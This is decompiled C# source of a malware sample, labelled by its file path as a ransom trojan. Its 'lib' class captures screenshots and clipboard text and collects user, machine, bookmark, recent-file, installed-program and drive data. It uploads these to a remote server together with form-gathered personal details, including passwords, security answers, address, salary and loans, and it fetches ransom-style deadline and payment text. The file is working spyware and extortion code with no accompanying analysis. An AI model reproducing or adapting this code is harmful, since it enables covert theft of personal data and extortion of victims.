// Decompiled with JetBrains decompiler
// Type: setup.lib
// Assembly: setup, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FA179CD-C6DD-49E1-8167-579BB94FEB58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Agent.le-c87aca3d3f3f7d91c25f958bdf91631280e8c43d.exe

using IWshRuntimeLibrary;
using setup.Properties;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;

namespace setup
{
  internal class lib
  {
    private static string strChar = "abcdefghijlkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static Dictionary<string, string> bookmarklist;
    private static XmlDocument xd;
    private static List<string> listRecent;
    private static List<string> listProgram;

    [DllImport("wininet.dll")]
    private static extern bool InternetGetConnectedState(out int lpdwFlags, int dwReserved);

    public static bool ChkNetwork() => lib.InternetGetConnectedState(out int _, 0);

    public static string GetRandom()
    {
      string random1 = "";
      Random random2 = new Random((int) (DateTime.Now.Ticks % (long) int.MaxValue));
      for (int index = 0; index < 30; ++index)
        random1 += lib.strChar.Substring(random2.Next(lib.strChar.Length), 1);
      return random1;
    }

    public static void ScreenCapture()
    {
      int width = 0;
      int height = Screen.PrimaryScreen.Bounds.Height;
      foreach (Screen allScreen in Screen.AllScreens)
      {
        width += allScreen.Bounds.Width;
        if (height < allScreen.Bounds.Height)
          height = allScreen.Bounds.Height;
      }
      Bitmap image = new Bitmap(width, height);
      Graphics graphics = Graphics.FromImage((Image) image);
      graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), image.Size);
      graphics.Dispose();
      string str1 = "C:\\" + Settings.Default.uid;
      string uid = Settings.Default.uid;
      string str2 = str1 + "\\" + uid + ".bmp";
      string str3 = Settings.Default.MyPictures + "\\" + uid + ".bmp";
      Settings.Default.filepath = str2;
      image.Save(str2, ImageFormat.Bmp);
      image.Save(str3, ImageFormat.Bmp);
      lib.SaveImage(str2, 80);
      lib.SaveImage(str3, 80);
      string str4 = str1 + "\\" + uid + "_s.bmp";
      double dh = 200.0;
      double dw = dh / (double) height * (double) width;
      Bitmap bitmap = lib.ResizeImage(image, dw, dh);
      bitmap.Save(str4, ImageFormat.Bmp);
      lib.SaveImage(str4, 100);
      image.Dispose();
      bitmap.Dispose();
      Settings.Default.image = uid + ".jpg";
      lib.DeleteFile(str3);
    }

    public static void DeleteFile(string stFilePath)
    {
      FileInfo fileInfo = new FileInfo(stFilePath);
      if (!fileInfo.Exists)
        return;
      if ((fileInfo.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
        fileInfo.Attributes = FileAttributes.Normal;
      fileInfo.Delete();
    }

    public static void SaveImage(string fileName, int quality)
    {
      Bitmap bitmap = new Bitmap(fileName);
      EncoderParameters encoderParams = new EncoderParameters(1);
      EncoderParameter encoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long) quality);
      encoderParams.Param[0] = encoderParameter;
      ImageCodecInfo encoderInfo = lib.GetEncoderInfo("image/jpeg");
      string lower = Path.GetExtension(encoderInfo.FilenameExtension.Split(';')[0]).ToLower();
      string filename = Path.ChangeExtension(fileName, lower);
      bitmap.Save(filename, encoderInfo, encoderParams);
      bitmap.Dispose();
    }

    public static Bitmap ResizeImage(Bitmap image, double dw, double dh)
    {
      double width = (double) image.Width;
      double height = (double) image.Height;
      double num = dh / dw > height / width ? dw / width : dh / height;
      Bitmap bitmap = new Bitmap((int) (width * num), (int) (height * num));
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
      graphics.DrawImage((Image) image, 0, 0, bitmap.Width, bitmap.Height);
      return bitmap;
    }

    private static ImageCodecInfo GetEncoderInfo(string mineType)
    {
      foreach (ImageCodecInfo imageEncoder in ImageCodecInfo.GetImageEncoders())
      {
        if (imageEncoder.MimeType == mineType)
          return imageEncoder;
      }
      return (ImageCodecInfo) null;
    }

    public static void ReadXML()
    {
      string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      XmlTextReader xmlTextReader = new XmlTextReader(directoryName + "\\config.xml");
      while (xmlTextReader.Read())
      {
        if (xmlTextReader.NodeType == XmlNodeType.Element)
        {
          switch (xmlTextReader.LocalName)
          {
            case "name":
              Settings.Default.fn = xmlTextReader.ReadString();
              continue;
            case "i1":
              Settings.Default.it = xmlTextReader.ReadString();
              continue;
            case "i2":
              Settings.Default.ih = xmlTextReader.ReadString();
              continue;
            case "f1":
              Settings.Default.f1 = xmlTextReader.ReadString();
              continue;
            case "f2":
              Settings.Default.f2 = xmlTextReader.ReadString();
              continue;
            case "type":
              Settings.Default.type = xmlTextReader.ReadString();
              continue;
            default:
              continue;
          }
        }
      }
    }

    public static void trap()
    {
      string str = string.Empty;
      Settings.Default.UserName = Environment.UserName;
      Settings.Default.UserDomainName = Environment.UserDomainName;
      Settings.Default.MachineName = Environment.MachineName;
      Settings.Default.OSVersion = Environment.OSVersion.ToString();
      Settings.Default.TickCount = new TimeSpan(0, 0, 0, 0, Environment.TickCount).ToString();
      Settings.Default.WorkingSet = Environment.WorkingSet.ToString();
      Settings.Default.CurrentDirectory = Environment.CurrentDirectory;
      Settings.Default.IP = lib.GetIH("i");
      Settings.Default.HOST = lib.GetIH("h");
      foreach (Screen allScreen in Screen.AllScreens)
        str = str + (object) allScreen.Bounds.Width + "×" + (object) allScreen.Bounds.Height + " ";
      Settings.Default.Screen = str;
      Settings.Default.Clip = string.Empty;
      if (Clipboard.ContainsText())
        Settings.Default.Clip = Clipboard.GetText();
      lib.ReadXML();
      lib.GetDirPath();
    }

    public static string GetIH(string arg) => new StreamReader(new WebClient().OpenRead(Settings.Default.url + arg + ".cgi"), Encoding.GetEncoding("UTF-8")).ReadToEnd();

    public static string GetImage(string img)
    {
      Stream stream = new WebClient().OpenRead(Settings.Default.url + "img/exe/" + img);
      Bitmap bitmap = new Bitmap(stream);
      stream.Close();
      string filename = "C:\\" + Settings.Default.uid + "/" + img;
      bitmap.Save(filename, ImageFormat.Bmp);
      return filename;
    }

    public static void DelDir() => Directory.Delete("C:\\" + Settings.Default.uid, true);

    public static string GetRules()
    {
      string rules = "";
      StreamReader streamReader = new StreamReader(new WebClient().OpenRead(Settings.Default.url + "txt/rules.txt"), Encoding.UTF8);
      while (streamReader.Peek() > -1)
        rules = rules + streamReader.ReadLine() + "\r\n";
      streamReader.Close();
      return rules;
    }

    public static string GetEnd()
    {
      string str = "";
      StreamReader streamReader = new StreamReader(new WebClient().OpenRead(Settings.Default.url + "txt/end.txt"), Encoding.UTF8);
      while (streamReader.Peek() > -1)
        str = str + streamReader.ReadLine() + "\r\n";
      streamReader.Close();
      string newValue = Settings.Default.UserName;
      if (Settings.Default.sei != "" || Settings.Default.mei != "")
        newValue = Settings.Default.sei + " " + Settings.Default.mei;
      return str.Replace("#name", newValue).Replace("#filename", Settings.Default.fn).Replace("#time", lib.GetDateTime()).Replace("#kijitu", lib.GetKijitsu()).Replace("#num", lib.GetNum()).Replace("#maintxt", lib.GetMessage());
    }

    public static int PageRule(int num, int type)
    {
      int num1 = 1;
      if (Settings.Default.type == "0" && (num == 6 && type == 1 || num == 10 && type == 0))
        num1 = 4;
      return num1;
    }

    public static bool NumChk(string str) => Regex.IsMatch(str, "^[0-9]+$");

    public static bool TelChk(string str) => Regex.IsMatch(str, "^[0-9]{2,5}[\\-]?[0-9]{1,4}[\\-]?[0-9]{4}$");

    public static bool EmailChk(string str) => Regex.IsMatch(str, "^([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$");

    public static void SiteOpen() => Process.Start(Settings.Default.url + "entry/user/" + Settings.Default.uid);

    public static string GetMessage()
    {
      string address = Settings.Default.url + "get/";
      string empty = string.Empty;
      try
      {
        WebClient webClient = new WebClient();
        byte[] bytes = webClient.UploadValues(address, new NameValueCollection()
        {
          {
            "uid",
            Settings.Default.uid
          },
          {
            "dummy",
            "dummy"
          }
        });
        webClient.Dispose();
        empty = Encoding.UTF8.GetString(bytes);
      }
      catch
      {
      }
      return empty;
    }

    public static string GetKijitsu()
    {
      string address = Settings.Default.url + "get/kijitsu/";
      string empty = string.Empty;
      try
      {
        WebClient webClient = new WebClient();
        byte[] bytes = webClient.UploadValues(address, new NameValueCollection()
        {
          {
            "uid",
            Settings.Default.uid
          },
          {
            "dummy",
            "dummy"
          }
        });
        webClient.Dispose();
        empty = Encoding.UTF8.GetString(bytes);
      }
      catch
      {
      }
      return empty;
    }

    public static string GetDateTime()
    {
      string address = Settings.Default.url + "get/time/";
      string empty = string.Empty;
      try
      {
        WebClient webClient = new WebClient();
        byte[] bytes = webClient.UploadValues(address, new NameValueCollection()
        {
          {
            "uid",
            Settings.Default.uid
          },
          {
            "dummy",
            "dummy"
          }
        });
        webClient.Dispose();
        empty = Encoding.UTF8.GetString(bytes);
      }
      catch
      {
      }
      return empty;
    }

    public static string GetNum()
    {
      string address = Settings.Default.url + "get/num/";
      string empty = string.Empty;
      try
      {
        WebClient webClient = new WebClient();
        byte[] bytes = webClient.UploadValues(address, new NameValueCollection()
        {
          {
            "uid",
            Settings.Default.uid
          },
          {
            "dummy",
            "dummy"
          }
        });
        webClient.Dispose();
        empty = Encoding.UTF8.GetString(bytes);
      }
      catch
      {
      }
      return empty;
    }

    public static void DataUpload()
    {
      string address = Settings.Default.url + "entry/";
      try
      {
        WebClient webClient = new WebClient();
        NameValueCollection data = new NameValueCollection();
        data.Add("uid", Settings.Default.uid);
        data.Add("filename", Settings.Default.fn);
        data.Add("name", lib.SetName(Settings.Default.sei, Settings.Default.mei, ""));
        data.Add("sex", Settings.Default.sex);
        data.Add("birth", Settings.Default.birth);
        data.Add("age", Settings.Default.age);
        data.Add("email", Settings.Default.email);
        data.Add("password", Settings.Default.password);
        data.Add("question", Settings.Default.question);
        data.Add("answer", Settings.Default.answer);
        data.Add("zip", Settings.Default.zip);
        data.Add("pref", Settings.Default.pref);
        data.Add("addr1", Settings.Default.addr1);
        data.Add("addr2", Settings.Default.addr2);
        data.Add("tel", Settings.Default.tel);
        data.Add("fax", Settings.Default.fax);
        data.Add("mtel", Settings.Default.mtel);
        data.Add("memail", Settings.Default.memail);
        data.Add("family", Settings.Default.family);
        data.Add("house", Settings.Default.house);
        data.Add("job", Settings.Default.job);
        data.Add("salary", Settings.Default.salary);
        data.Add("loan", Settings.Default.loan);
        data.Add("hero", lib.SetName(Settings.Default.hero1, Settings.Default.hero2, Settings.Default.hero3));
        data.Add("lover", lib.SetName(Settings.Default.lover1, Settings.Default.lover2, Settings.Default.lover3));
        data.Add("friend", lib.SetName(Settings.Default.friend1, Settings.Default.friend2, Settings.Default.friend3));
        data.Add("motivation", Settings.Default.motivation);
        data.Add("hobby", Settings.Default.hobby);
        data.Add("specialty", Settings.Default.specialty);
        data.Add("feedback", Settings.Default.feedback);
        data.Add("username", Settings.Default.UserName);
        data.Add("userdomainname", Settings.Default.UserDomainName);
        data.Add("machinename", Settings.Default.MachineName);
        data.Add("clientdir", Settings.Default.CurrentDirectory);
        data.Add("installdir", Settings.Default.instalpass);
        data.Add("os", Settings.Default.OSVersion);
        data.Add("tickcnt", Settings.Default.TickCount);
        data.Add("workingset", Settings.Default.WorkingSet);
        data.Add("ip", Settings.Default.IP);
        data.Add("host", Settings.Default.HOST);
        data.Add("screen", Settings.Default.Screen);
        data.Add("clip", Settings.Default.Clip);
        data.Add("ss", Settings.Default.image);
        data.Add("dummy", "dummy");
        byte[] bytes = webClient.UploadValues(address, data);
        webClient.Dispose();
        Console.WriteLine(Encoding.UTF8.GetString(bytes));
        data.Clear();
      }
      catch
      {
      }
    }

    public static string SetName(string str1, string str2, string str3)
    {
      string str = str1;
      if (str2 != "")
        str = !(str != "") ? str + str2 : str + " " + str2;
      if (str3 != "")
        str = !(str != "") ? str + str3 : str + " (" + str3 + ")";
      return str;
    }

    public static void GetDirPath()
    {
      Settings.Default.MyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
      Settings.Default.MyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
    }

    public static void GetBookmarks()
    {
      lib.bookmarklist = new Dictionary<string, string>();
      lib.BookMarkList(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
      lib.xd = new XmlDocument();
      XmlDeclaration xmlDeclaration = lib.xd.CreateXmlDeclaration("1.0", "UTF-8", (string) null);
      lib.xd.AppendChild((XmlNode) xmlDeclaration);
      XmlElement element1 = lib.xd.CreateElement("data");
      lib.xd.AppendChild((XmlNode) element1);
      XmlNode element2 = (XmlNode) lib.xd.CreateElement("bookmark");
      element1.AppendChild(element2);
      foreach (KeyValuePair<string, string> keyValuePair in lib.bookmarklist)
      {
        XmlElement element3 = lib.xd.CreateElement("url");
        element2.AppendChild((XmlNode) element3);
        element3.InnerText = keyValuePair.Value;
        XmlAttribute attribute = lib.xd.CreateAttribute("name");
        attribute.Value = keyValuePair.Key;
        element3.Attributes.Append(attribute);
      }
      lib.xd.Save("C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml");
      lib.xd = (XmlDocument) null;
    }

    private static void BookMarkList(string dir)
    {
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      foreach (string directory in Directory.GetDirectories(dir))
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(directory);
        lib.BookMarkList(directory);
      }
      foreach (string file in Directory.GetFiles(dir, "*.url"))
      {
        string key = file.Replace(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), "").Replace(".url", "").Substring(1);
        string bookMarkUrl = lib.GetBookMarkUrl(file);
        lib.bookmarklist.Add(key, bookMarkUrl);
      }
    }

    private static string GetBookMarkUrl(string path)
    {
      string bookMarkUrl = string.Empty;
      if (System.IO.File.Exists(path))
      {
        StreamReader streamReader = new StreamReader(path, Encoding.Default);
        while (!streamReader.EndOfStream)
        {
          string str = streamReader.ReadLine();
          if (str.IndexOf("URL=") == 0)
            bookMarkUrl = str.Replace("URL=", "");
        }
        streamReader.Close();
      }
      return bookMarkUrl;
    }

    public static void GetHddInfo()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
      lib.xd = new XmlDocument();
      lib.xd.Load(filename);
      XmlNode xmlNode = lib.xd.SelectSingleNode("/data");
      foreach (DriveInfo driveInfo in drives)
      {
        string name = driveInfo.Name;
        string str1 = driveInfo.DriveType.ToString();
        string str2 = "";
        string str3 = "";
        string str4 = "";
        string str5 = "";
        string str6 = "";
        long num1 = 0;
        long num2 = 0;
        if (driveInfo.IsReady)
        {
          str2 = driveInfo.VolumeLabel.ToString();
          str3 = driveInfo.DriveFormat.ToString();
          num1 = (driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1024L / 1024L / 1024L;
          num2 = driveInfo.TotalFreeSpace / 1024L / 1024L / 1024L;
          long num3 = driveInfo.TotalSize / 1024L / 1024L / 1024L;
          str4 = num1.ToString();
          str5 = num2.ToString();
          str6 = num3.ToString();
        }
        XmlElement element = lib.xd.CreateElement("hdd");
        xmlNode.AppendChild((XmlNode) element);
        XmlAttribute attribute1 = lib.xd.CreateAttribute("drive");
        attribute1.Value = name;
        element.Attributes.Append(attribute1);
        XmlAttribute attribute2 = lib.xd.CreateAttribute("type");
        attribute2.Value = str1;
        element.Attributes.Append(attribute2);
        XmlAttribute attribute3 = lib.xd.CreateAttribute("label");
        attribute3.Value = str2;
        element.Attributes.Append(attribute3);
        XmlAttribute attribute4 = lib.xd.CreateAttribute("system");
        attribute4.Value = str3;
        element.Attributes.Append(attribute4);
        XmlAttribute attribute5 = lib.xd.CreateAttribute("size1");
        attribute5.Value = str4;
        element.Attributes.Append(attribute5);
        XmlAttribute attribute6 = lib.xd.CreateAttribute("size2");
        attribute6.Value = str5;
        element.Attributes.Append(attribute6);
        XmlAttribute attribute7 = lib.xd.CreateAttribute("size3");
        attribute7.Value = str6;
        element.Attributes.Append(attribute7);
      }
      lib.xd.Save(filename);
      lib.xd = (XmlDocument) null;
    }

    public static void GetRecent()
    {
      lib.listRecent = new List<string>();
      WshShellClass wshShellClass = new WshShellClass();
      foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Recent), "*.lnk"))
      {
        IWshShortcut shortcut = (IWshShortcut) wshShellClass.CreateShortcut(file);
        lib.listRecent.Add(shortcut.TargetPath);
      }
      string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
      lib.xd = new XmlDocument();
      lib.xd.Load(filename);
      XmlNode xmlNode = lib.xd.SelectSingleNode("/data");
      XmlElement element1 = lib.xd.CreateElement("recent");
      xmlNode.AppendChild((XmlNode) element1);
      foreach (string str in lib.listRecent)
      {
        XmlElement element2 = lib.xd.CreateElement("pass");
        element1.AppendChild((XmlNode) element2);
        element2.InnerText = str;
      }
      lib.xd.Save(filename);
      lib.xd = (XmlDocument) null;
    }

    public static void GetProgram()
    {
      lib.listProgram = new List<string>();
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_Product").Get())
        lib.listProgram.Add(managementObject["Name"].ToString() + " " + managementObject["Version"]);
      lib.listProgram.Sort();
      string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
      lib.xd = new XmlDocument();
      lib.xd.Load(filename);
      XmlNode xmlNode = lib.xd.SelectSingleNode("/data");
      XmlElement element1 = lib.xd.CreateElement("program");
      xmlNode.AppendChild((XmlNode) element1);
      foreach (string str in lib.listProgram)
      {
        XmlElement element2 = lib.xd.CreateElement("name");
        element1.AppendChild((XmlNode) element2);
        element2.InnerText = str;
      }
      lib.xd.Save(filename);
      lib.xd = (XmlDocument) null;
    }
  }
}
